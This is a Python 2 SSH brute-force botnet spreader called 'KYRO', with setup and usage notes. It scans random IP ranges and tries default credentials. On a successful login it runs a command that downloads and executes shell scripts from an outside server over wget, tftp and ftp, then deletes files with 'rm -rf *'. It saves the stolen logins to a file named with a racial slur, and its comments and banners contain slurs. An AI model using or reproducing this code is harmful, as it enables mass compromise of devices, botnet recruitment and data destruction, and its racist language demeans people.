#!/usr/bin/env python
#                                           888    d8P Y88b   d88P 8888888b.   .d88888b.  
#                                           888   d8P   Y88b d88P  888   Y88b d88P" "Y88b 
#                                           888  d8P     Y88o88P   888    888 888     888 
#                                           888d88K       Y888P    888   d88P 888     888 
#                                           8888888b       888     8888888P"  888     888 
#                                           888  Y88b      888     888 T88b   888     888 
#                                           888   Y88b     888     888  T88b  Y88b. .d88P 
#                                           888    Y88b    888     888   T88b  "Y88888P"
#		                                    If you Have this That Means you are Trusted
#                                   DO NOT TAKE PICS DO NOT SHOW ANYONE THIS DO NOT SCREEN SHARE KYRO 
# 
# 

# MUST INSTALL THE FOLLOING BELOW

# yum update -y

# yum install nano -y

# yum install gcc python-paramiko -y

# nano /usr/include/bits/typesizes.h

# scroll down and edit the 1024 to 999999

# THEN SAVE IT 

# ulimit -n 999999

# Usage: python KYRO.py THREADS RANGES 1(slow but effective) 2(fast but less effective) HERE IS A EXAMPLE 

#       python KYRO.py 500 5.78 101

#     ^^^^^^^slow but affective ^^^^^^^^

#       python KYRO.py 500 B 119.93 3 

#     ^^^^^^Fast But Not As stable^^^^^^

# Examples Below

# python KYRO.py 500 LUCKY 1 1

# python KYRO.py 500 LUCKY3 1 4

# python KYRO.py 500 LUCKY2 1 3

# python KYRO.py 500 B 49.144 3

#

# RANGES 113.53, 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127'
]

passwords = [ 
  "telnet:telnet"
  "admin:1234",
  "root:root",
  "ubnt:ubnt",
  "vagrant:vagrant",
  "pi:raspberry",
  "root:maxided"
      "root:123456",
    "root:Love2020",
    "root:Zero",
    "root:Password",
    "root:password",
    "root:qwerty",
    "root:dragon",
    "root:pussy",
    "root:baseball",
    "root:football",
    "root:monkey",
    "root:696969",
    "root:abc123"
	"admin:admin",
	"admin:1234",
	"admin:Guest",
	"ubnt:ubnt",
	"guest:guest",
	"user:user",
	"test:test",
  
]

if sys.argv[4] == '1':
     passwords = ["root:root"] # ALRIGHT 
if sys.argv[4] == '2':
     passwords = ["guest:guest"] #EHH
if sys.argv[4] == '3':
     passwords = ["admin:1234"] #ALRIGHT
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"] #SEXY
if sys.argv[4] == '5':
	passwords = ["root:root", "admin:1234"]

print "\x1b[1;35m            __  __ ___ __\x1b[1;35m"
print "\x1b[1;35m           |__)/  \ | (_ \x1b[1;35m"
print "\x1b[1;35m           |__)\__/ | __)\x1b[1;35m"
print "\x1b[1;35m           ~{BIG DuMpA}~\x1b[1;35m"
print "\x1b[1;35m Bots Should Be Joining By Time You Read This\x1b[1;35m"
print "\x1b[1;35m unless you are a retard and didn't set your ulimit\x1b[1;35m"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    #DONT FUCK WITH ANY OF THIS STUFF
                    elif ipclassinfo == "LUCKY":
                        lucky = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = lucky2 = [ "122.3","210.213","59.69","122.52","122.54","119.93","124.105","125.104","119.92","119.91","49.144" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "LUCKY3":
                        lucky2 = [ "103.20","103.30","103.47","103.57","12.188","12.34" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))

                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print 'Gave A homless man a dollar ' +self.host+'|'+username+'|'+password+'|'+str(port)
			ssh.exec_command("cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.63.111.83/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 45.63.111.83 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.63.111.83; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.63.111.83 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
			nigger = open("niggers.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(15)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
